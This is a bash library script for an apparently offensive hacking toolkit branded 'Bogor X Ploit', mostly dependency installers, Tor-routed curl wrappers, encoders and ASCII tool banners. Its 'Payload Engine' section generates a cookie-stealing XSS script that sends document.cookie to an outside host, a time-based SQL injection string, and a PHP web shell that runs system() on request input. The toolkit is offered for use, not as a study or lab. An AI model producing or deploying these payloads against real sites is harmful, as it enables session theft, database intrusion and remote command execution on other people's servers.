#!/usr/bin/env bash
# ============================================
#   BXP CORE LIBRARY v2.9 (Cinematic + Auto-Dep + Scroll Fix)
#   By Bogor X Ploit x Ijul v2.0
# ============================================

export C='\033[0;36m'; export B='\033[0;34m'; export W='\033[1;37m'
export R='\033[0;31m'; export Y='\033[1;33m'; export G='\033[0;32m'; export N='\033[0m'

# --- 0. AUTO-INSTALL ENGINE ---
bxp_require() {
    local cmds=("$@")
    local missing=()
    
    for cmd in "${cmds[@]}"; do
        if ! command -v "$cmd" >/dev/null 2>&1 && ! type -P "$cmd" >/dev/null 2>&1; then
            missing+=("$cmd")
        fi
    done

    if [ ${#missing[@]} -eq 0 ]; then return 0; fi

    if [ -n "$PREFIX" ] && echo "$PREFIX" | grep -qi "com.termux"; then
        pkg update -y >/dev/null 2>&1
        for pkg in "${missing[@]}"; do
            if [ "$pkg" == "dig" ]; then pkg="dnsutils"; fi
            pkg install -y "$pkg" >/dev/null 2>&1
        done
    elif command -v apt >/dev/null 2>&1; then
        sudo apt update -y >/dev/null 2>&1
        for pkg in "${missing[@]}"; do
            if [ "$pkg" == "dig" ]; then pkg="dnsutils"; fi
            sudo apt install -y "$pkg" >/dev/null 2>&1
        done
    elif command -v pacman >/dev/null 2>&1; then
        for pkg in "${missing[@]}"; do
            if [ "$pkg" == "dig" ]; then pkg="bind"; fi
            sudo pacman -Sy --noconfirm "$pkg" >/dev/null 2>&1
        done
    fi
}

# --- 1. PROXY INTERCEPTOR ENGINE ---
bxp_curl() {
    if [ -f "$HOME/.vpn_state" ] || [ -f "./.vpn_state" ] || pgrep -x tor >/dev/null 2>&1; then
        command curl -s -x socks5h://127.0.0.1:9050 "$@"
    else
        command curl "$@"
    fi
}

# --- 2. Network Engine ---
bxp_http_request() {
    local url="$1"; local payload="$2"
    local user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) BXP-Engine/2.0"
    local response_time
    response_time=$(bxp_curl -A "$user_agent" --max-time 5 -o /dev/null -w "%{time_total}" "${url}${payload}" 2>/dev/null)
    if [ -z "$response_time" ] || [ "$response_time" = "0.000000" ]; then
        echo "TIMEOUT/ERROR"
    else
        echo "$response_time"
    fi
}

# --- 3. Encoder Engine ---
bxp_encode_b64() { echo -n "$1" | base64 | tr -d '\n'; }
bxp_encode_hex() {
    if command -v xxd >/dev/null 2>&1; then
        echo -n "$1" | xxd -p | tr -d '\n'
    else
        echo -n "$1" | od -An -tx1 | tr -d ' \n'
    fi
}
bxp_encode_url() { 
    echo -n "$1" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$1"; 
}

# --- 4. Payload Engine ---
bxp_gen_xss() { local host="$1" proto="${2:-http}"; echo "<script>new Image().src='${proto}://${host}:2010/?c='+encodeURIComponent(document.cookie);</script>"; }
bxp_gen_sqli() { [[ "$1" =~ ^[0-9]+$ ]] || return 1; echo "1' AND (SELECT 1 FROM (SELECT SLEEP($1))a)-- -"; }
bxp_gen_php_shell() { echo "<?php if(isset(\$_REQUEST['c'])){ system(\$_REQUEST['c']); } ?>"; }

# --- 5. System Engine ---
bxp_hide_process() {
    local cmd="$1"
    nohup bash -c "$cmd" >/dev/null 2>&1 &
    disown 2>/dev/null || true
}

bxp_check_root() {
    if [ "$(id -u)" -eq 0 ]; then echo "Root"; else
        if command -v su >/dev/null 2>&1 && timeout 3 su -c id >/dev/null 2>&1; then echo "Root (su available)"; else echo "Non-Root"; fi
    fi
}

# --- 6. BXP BOOT SEQUENCE ENGINE (CINEMATIC) ---
bxp_boot_sequence() {
    local TOOL_NAME="$1"
    local IS_FRESH_INSTALL="${2:-0}"
    local START_TIME=$(date +%s%3N)
    local IS_ROOT=0
    local ENV_TYPE="Unknown"
    
    bxp_require "openssl" "curl" "ping" "awk" "grep"
    
    if [ "$(id -u)" -eq 0 ]; then IS_ROOT=1
    elif command -v su >/dev/null 2>&1 && timeout 3 su -c id >/dev/null 2>&1; then IS_ROOT=1
    elif command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then IS_ROOT=1; fi
    
    if [ -n "$PREFIX" ] && echo "$PREFIX" | grep -qi "com.termux"; then ENV_TYPE="Termux"; else ENV_TYPE="PC"; fi
    
    bxp_step_sleep() { sleep "${BXP_SLEEP_FAST:-0.15}"; }
    bxp_step_sleep_slow() { sleep "${BXP_SLEEP_SLOW:-0.45}"; }

    local msg_install="Downloading required modules..."
    local msg_sync="Synchronizing runtime protocols..."
    local msg_stealth="Preparing stealth layer..."
    local msg_track="Hiding process tracks..."
    
    case "$TOOL_NAME" in
        "SHADOW LINEAGE")
            msg_stealth="Awakening the shadows..."
            msg_track="Loading native wordlist..."
            ;;
        "PULSE CHECK")
            msg_stealth="Calibrating pulse sensor..."
            msg_track="Mapping TCP socket routes..."
            ;;
        "BLOODHOUND")
            msg_stealth="Releasing the hound..."
            msg_track="Sniffing target coordinates..."
            ;;
        "EXHUME DISGUISE")
            msg_stealth="Applying stealth disguise..."
            msg_track="Hiding process tracks..."
            ;;
        "RECLAIM CATCH")
            msg_stealth="Entering promiscuous mode..."
            msg_track="Sniffing mid-air packets..."
            ;;
        "CHOKE THE HUNTERS")
            msg_stealth="Initializing packet interceptor..."
            msg_track="Throttling connection..."
            ;;
    esac

    if [ "$IS_FRESH_INSTALL" -eq 1 ]; then
        echo -e "  ${Y}[*] ${msg_install}${N}"
    else
        echo -e "  ${Y}[*] ${msg_sync}${N}"
    fi
    bxp_step_sleep_slow
    
    local BASH_VER=$(echo "$BASH_VERSION" | cut -d'(' -f1)
    echo -e "  ${G}[ OK ]${N} bash version: ${BASH_VER}"
    bxp_step_sleep
    
    echo -ne "  ${Y}[*] Checking privilege level...${N}"; bxp_step_sleep
    if [ "$IS_ROOT" -eq 1 ]; then
        if [ "$ENV_TYPE" = "Termux" ]; then echo -e " ${G}[ ROOT - Android ]${N}"; else echo -e " ${G}[ ROOT - PC ]${N}"; fi
    else
        echo -e " ${R}[ NON-ROOT ]${N}"
    fi

    if [ "$IS_ROOT" -eq 1 ]; then
        if [ "$ENV_TYPE" = "Termux" ]; then
            echo -ne "  ${Y}[*] Querying SELinux status...${N}"; bxp_step_sleep
            if command -v getenforce >/dev/null 2>&1 && [ "$(getenforce)" = "Enforcing" ]; then echo -e " ${Y}[ WARN ] Enforcing${N}"; else echo -e " ${G}[ OK ] Permissive/Disabled${N}"; fi
        else
            echo -ne "  ${Y}[*] Checking System Firewall...${N}"; bxp_step_sleep
            if command -v ufw >/dev/null 2>&1; then echo -e " ${G}[ OK ] UFW Detected${N}"; else echo -e " ${Y}[ WARN ] No UFW Found${N}"; fi
        fi
    else
        echo -ne "  ${Y}[*] Checking monitor mode capability...${N}"; bxp_step_sleep
        if command -v iw >/dev/null 2>&1 && iw dev 2>/dev/null | grep -q "monitor"; then echo -e " ${G}[ OK ] Supported${N}"; else echo -e " ${Y}[ WARN ] Hardware Limitation${N}"; fi
    fi

    echo -ne "  ${Y}[*] Verifying cryptographic engine...${N}"; bxp_step_sleep
    echo -e " ${G}[ OK ] Synchronized${N}"
    
    echo -ne "  ${Y}[*] Verifying proxy configuration...${N}"; bxp_step_sleep
    if [ -n "$http_proxy" ] || [ -n "$https_proxy" ] || [ -f "$HOME/.vpn_state" ]; then 
        echo -e " ${G}[ OK ] Detected${N}"
    else 
        echo -e " ${Y}[ WARN ] Direct Connection${N}"
    fi

    echo -ne "  ${Y}[*] Verifying storage permissions...${N}"; bxp_step_sleep
    if [ "$ENV_TYPE" = "Termux" ]; then
        if [ -d "/sdcard" ] && [ -r "/sdcard" ]; then echo -e " ${G}[ OK ] /sdcard writable${N}"; else echo -e " ${R}[ DENIED ] Run termux-setup-storage${N}"; fi
    else
        if [ -w "$HOME" ]; then echo -e " ${G}[ OK ] Home directory writable${N}"; else echo -e " ${R}[ DENIED ] No write access${N}"; fi
    fi

    echo -ne "  ${Y}[*] ${msg_stealth}${N}"; bxp_step_sleep
    echo -e " ${G}[ OK ]${N}"

    echo -ne "  ${Y}[*] Allocating memory...${N}"; bxp_step_sleep
    if [ -f /proc/meminfo ]; then
        MEM_AVAIL=$(grep MemAvailable /proc/meminfo | awk '{print $2}'); MEM_MB=$((MEM_AVAIL / 1024))
        echo -e " ${G}[ OK ] ${MEM_MB} MB${N}"
    else
        echo -e " ${Y}[ WARN ] Limited${N}"
    fi

    echo -ne "  ${Y}[*] Pinging 8.8.8.8 ...${N}"; bxp_step_sleep
    local PING_START=$(date +%s%3N)
    if ping -c 4 -W 2 8.8.8.8 >/dev/null 2>&1; then
        local PING_END=$(date +%s%3N); local PING_TIME=$((PING_END - PING_START))
        echo -e " ${G}[ OK ] Connected (${PING_TIME}ms)${N}"
    else
        echo -e " ${R}[ FAIL ] Offline${N}"
    fi

    echo -ne "  ${Y}[*] Initializing core processes...${N}"; bxp_step_sleep
    PROC_COUNT=$(ps -A 2>/dev/null | wc -l)
    echo -e " ${G}[ OK ] ${PROC_COUNT} PIDs${N}"

    echo -ne "  ${Y}[*] ${msg_track}${N}"; bxp_step_sleep
    echo -e " ${G}[ OK ]${N}"

    local END_TIME=$(date +%s%3N); local ELAPSED=$((END_TIME - START_TIME))
    
    echo -e "  ${G}[ SUCCESS ]${N} LAUNCHING ${W}${TOOL_NAME}${N}"; bxp_step_sleep_slow
    echo -e "  ${G}[+] Module ready. (${ELAPSED}ms)${N}"
}

# --- 7. HEADER ASCII ENGINE ---
bxp_ascii_title() {
    local title="$1"; clear; sleep 0.2
    case "$title" in
        "NYCTOPHOBIA")
            echo -e "\033[38;2;0;255;255m"; cat <<'ASCII'
 _   _  __   __  ____  _____  ___   ____   _   _   ___   ____  ___   _    
| \ | | \ \ / / / ___||_   _|/ _ \ |  _ \ | | | | / _ \ | __ )|_ _| / \   
|  \| |  \ V / | |      | | | | | || |_) || |_| || | | ||  _ \ | | / _ \  
| |\  |   | |  | |___   | | | |_| ||  __/ |  _  || |_| || |_) || ||  _  | 
|_| \_|   |_|   \____|  |_|  \___/ |_|    |_| |_| \___/ |____/|___|_| |_| 
ASCII
            echo -e "\033[0m\n" ;;
        "SLEEP PARALYSIS")
            echo -e "\033[38;2;255;0;0m"; cat <<'ASCII'
 ____  _      ____  ____  ____    ____    _    ____  _      __   __  ___  ____  
/ ___|| |    | ____|  _ \|  _ \  |  _ \  / \  |  _ \| |     \ \ / / / _ \|  _ \ 
\___ \| |    |  _| | |_) | |_) | | |_) |/ _ \ | |_) | |      \ V / | | | | |_) |
 ___) | |___ | |___|  __/|  __/  |  __// ___ \|  _ <| |___    | |  | |_| |  _ / 
|____/|_____||_____|_|   |_|     |_|  /_/   \_\_| \_\_____|   |_|   \___/|_| \_\
ASCII
            echo -e "\033[0m\n" ;;
        "NOCTURNAL DECAY")
            echo -e "\033[38;2;255;215;0m"; cat <<'ASCII'
 _   _  ____   ____  _____  _   _  ____    _     ____    ____   ____   _   __   __
| \ | |/ __ \ / ___||_   _|| | | ||  _ \  / \   |  _ \  |  _ \ / ___| / \  \ \ / /
|  \| | |  | | |      | |  | | | || |_) |/ _ \  | | | | | |_) | |    / _ \  \ V / 
| |\  | |__| | |___   | |  | |_| ||  _ <|  _  | | |_| | |  _ <| |___/ ___ \  | |  
|_| \_|\____/ \____|  |_|   \___/ |_| \_\_| |_| |____/  |_| \_\\____/_/   \_\ |_|  
ASCII
            echo -e "\033[0m\n" ;;
        "CYBER ATTACK")
            echo -e "\033[38;2;0;255;255m"; cat <<'ASCII'
  ██████╗██╗   ██╗██████╗ ███████╗██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
 ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
 ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
 ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
 ╚██████╗   ██║   ██████╔╝███████╗██║  ██║   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
ASCII
            echo -e "\033[0m\n" ;;
        "EXHUME DISGUISE")
            echo -e "\033[38;2;255;0;0m"; cat <<'ASCII'
███████╗██╗  ██╗██╗  ██╗██╗   ██╗███╗   ███╗███████╗    ██████╗ ██╗███████╗ ██████╗ ██╗   ██╗██╗███████╗███████╗
██╔════╝╚██╗██╔╝██║  ██║██║   ██║████╗ ████║██╔════╝    ██╔══██╗██║██╔════╝██╔════╝ ██║   ██║██║██╔════╝██╔════╝
█████╗   ╚███╔╝ ███████║██║   ██║██╔████╔██║█████╗      ██║  ██║██║███████╗██║  ███╗██║   ██║██║███████╗█████╗  
██╔══╝   ██╔██╗ ██╔══██║██║   ██║██║╚██╔╝██║██╔══╝      ██║  ██║██║╚════██║██║   ██║██║   ██║██║╚════██║██╔══╝  
███████╗██╔╝ ██╗██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗    ██████╔╝██║███████║╚██████╔╝╚██████╔╝██║███████║███████╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    ╚═════╝ ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚══════╝╚══════╝
ASCII
            echo -e "\033[0m\n" ;;
        "CHOKE THE HUNTERS")
            echo -e "\033[38;2;255;215;0m"; cat <<'ASCII'
██████╗██╗  ██╗ ██████╗ ██╗  ██╗███████╗    ████████╗██╗  ██╗███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ███████╗
██╔════╝██║  ██║██╔═══██╗██║ ██╔╝██╔════╝    ╚══██╔══╝██║  ██║██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝
██║     ███████║██║   ██║█████╔╝ █████╗         ██║   ███████║█████╗      ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝███████╗
██║     ██╔══██║██║   ██║██╔═██╗ ██╔══╝         ██║   ██╔══██║██╔══╝      ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗╚════██║
╚██████╗██║  ██║╚██████╔╝██║  ██╗███████╗       ██║   ██║  ██║███████╗    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║███████║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝       ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝
ASCII
            echo -e "\033[0m\n" ;;
        "RECLAIM CATCH")
            echo -e "\033[38;2;148;0;211m"; cat <<'ASCII'
██████╗ ███████╗ ██████╗██╗      █████╗ ██╗███╗   ███╗     ██████╗ █████╗ ████████╗ ██████╗██╗  ██╗
██╔══██╗██╔════╝██╔════╝██║     ██╔══██╗██║████╗ ████║    ██╔════╝██╔══██╗╚══██╔══╝██╔════╝██║  ██║
██████╔╝█████╗  ██║     ██║     ███████║██║██╔████╔██║    ██║     ███████║   ██║   ██║     ███████║
██╔══██╗██╔══╝  ██║     ██║     ██╔══██║██║██║╚██╔╝██║    ██║     ██╔══██║   ██║   ██║     ██╔══██║
██║  ██║███████╗╚██████╗███████╗██║  ██║██║██║ ╚═╝ ██║    ╚██████╗██║  ██║   ██║   ╚██████╗██║  ██║
╚═╝  ╚═╝╚══════╝ ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
ASCII
            echo -e "\033[0m\n" ;;
        "OUIJA MAGNIFYING")
            echo -e "\033[38;2;0;255;255m"; cat <<'ASCII'
 ██████╗ ██╗   ██╗██╗     ██╗ █████╗     ███╗   ███╗ █████╗  ██████╗ ███╗   ██╗██╗███████╗██╗   ██╗
██╔═══██╗██║   ██║██║    ██║██╔══██╗    ████╗ ████║██╔══██╗██╔════╝ ████╗  ██║██║██╔════╝╚██╗ ██╔╝
██║   ██║██║   ██║██║    ██║███████║    ██╔████╔██║███████║██║  ███╗██╔██╗ ██║██║█████╗   ╚████╔╝ 
██║   ██║██║   ██║██║    ██║██╔══██║    ██║╚██╔╝██║██╔══██║██║   ██║██║╚██╗██║██║██╔══╝    ╚██╔╝  
╚██████╔╝╚██████╔╝███████╗██║██║  ██║    ██║ ╚═╝ ██║██║  ██║╚██████╔╝██║ ╚████║██║██║        ██║   
 ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝        ╚═╝   
ASCII
            echo -e "\033[0m\n" ;;
        "SHADOW LINEAGE")
            echo -e "\033[38;2;57;255;20m"; cat <<'ASCII'
███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗    ██╗     ██╗███╗   ██╗███████╗ █████╗  ██████╗ ███████╗
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║    ██║     ██║████╗  ██║██╔════╝██╔══██╗██╔════╝ ██╔════╝
███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║    ██║     ██║██╔██╗ ██║█████╗  ███████║██║  ███╗█████╗  
╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║    ██║     ██║██║╚██╗██║██╔══╝  ██╔══██║██║   ██║██╔══╝  
███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝    ███████╗██║██║ ╚████║███████╗██║  ██║╚██████╔╝███████╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝     ╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
ASCII
            echo -e "\033[0m\n" ;;
        "PULSE CHECK")
            echo -e "\033[38;2;0;191;255m"; cat <<'ASCII'
██████╗ ██╗   ██╗██╗     ███████╗███████╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗
██╔══██╗██║   ██║██║     ██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝
██████╔╝██║   ██║██║     ███████╗█████╗      ██║     ███████║█████╗  ██║     █████╔╝ 
██╔═══╝ ██║   ██║██║     ╚════██║██╔══╝      ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ 
██║     ╚██████╔╝███████╗███████║███████╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗
╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝
ASCII
            echo -e "\033[0m\n" ;;
        "BLOODHOUND")
            echo -e "\033[38;2;0;120;255m"; cat <<'ASCII'
██████╗ ██╗      ██████╗  ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗
██████╔╝██║     ██║   ██║██║   ██║██║  ██║███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║
██╔══██╗██║     ██║   ██║██║   ██║██║  ██║██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
ASCII
            echo -e "\033[0m\n" ;;
        *)
            echo -e "${C}====================================================${N}"
            echo -e "${W}    ${title}${N}"
            echo -e "${C}====================================================${N}\n"
            ;;
    esac
    sleep 0.2
}
